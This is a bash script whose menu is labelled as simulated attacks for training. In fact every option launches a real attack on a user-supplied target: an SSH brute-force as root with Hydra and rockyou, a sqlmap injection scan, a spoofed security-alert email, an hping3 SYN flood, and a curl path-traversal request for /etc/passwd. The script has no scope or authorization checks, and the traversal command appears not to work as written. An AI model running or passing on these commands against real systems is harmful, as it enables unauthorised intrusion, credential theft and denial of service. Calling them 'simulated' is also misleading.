#!/bin/bash

CYAN='\033[1;36m'
RESET='\033[0m'

simulated_attacks() {
    while true; do
        clear
        echo -e "${CYAN}"
        echo "     _________________________________________"
        echo "    |              Ace of Clubs               |"
        echo "    |    Run Simulated Attacks for Training   |"
        echo "    |_________________________________________|"
        echo "    |                                         |"
        echo "    |  1. Simulate brute-force attack         |"
        echo "    |  2. Test SQL injection vulnerabilities  |"
        echo "    |  3. Run a phishing simulation           |"
        echo "    |  4. Simulate a DoS attack               |"
        echo "    |  5. Perform directory traversal test    |"
        echo "    |  6. Exit                                |"
        echo "    |_________________________________________|"
        echo -e "${RESET}"

        read -p "Choice: " choice
        case $choice in
            1)
                clear
                echo -e "${CYAN}Simulating brute-force attack on SSH...${RESET}"
                read -p "Enter target IP: " target
                hydra -l root -P /usr/share/wordlists/rockyou.txt "$target" ssh || \
                echo -e "${CYAN}Failed to simulate brute-force attack. Ensure Hydra is installed.${RESET}"
                ;;
            2)
                clear
                echo -e "${CYAN}Testing SQL injection vulnerabilities...${RESET}"
                read -p "Enter target URL: " url
                sqlmap -u "$url" --batch || \
                echo -e "${CYAN}Failed to perform SQL injection test. Ensure sqlmap is installed.${RESET}"
                ;;
            3)
                clear
                echo -e "${CYAN}Running phishing simulation...${RESET}"
                read -p "Enter target email: " email
                echo "This is a simulated phishing attack." | mail -s "Security Alert" "$email" && \
                echo -e "${CYAN}Phishing email sent to $email.${RESET}" || \
                echo -e "${CYAN}Failed to send phishing email.${RESET}"
                ;;
            4)
                clear
                echo -e "${CYAN}Simulating DoS attack...${RESET}"
                read -p "Enter target IP: " target
                hping3 -S --flood -p 80 "$target" || \
                echo -e "${CYAN}Failed to simulate DoS attack. Ensure hping3 is installed.${RESET}"
                ;;
            5)
                clear
                echo -e "${CYAN}Performing directory traversal test...${RESET}"
                read -p "Enter target URL: " url
                curl "$url/../../../../etc/passwd" && \
                echo -e "${CYAN}Directory traversal test complete.${RESET}" || \
                echo -e "${CYAN}Failed to perform directory traversal test.${RESET}"
                ;;
            6)
                echo -e "${CYAN}Exiting...${RESET}"
                break
                ;;
            *)
                echo -e "${CYAN}Invalid choice. Try again.${RESET}"
                ;;
        esac
        echo -e "${CYAN}Press any key to return to the menu...${RESET}"
        read -n 1 -s -r
    done
}

simulated_attacks
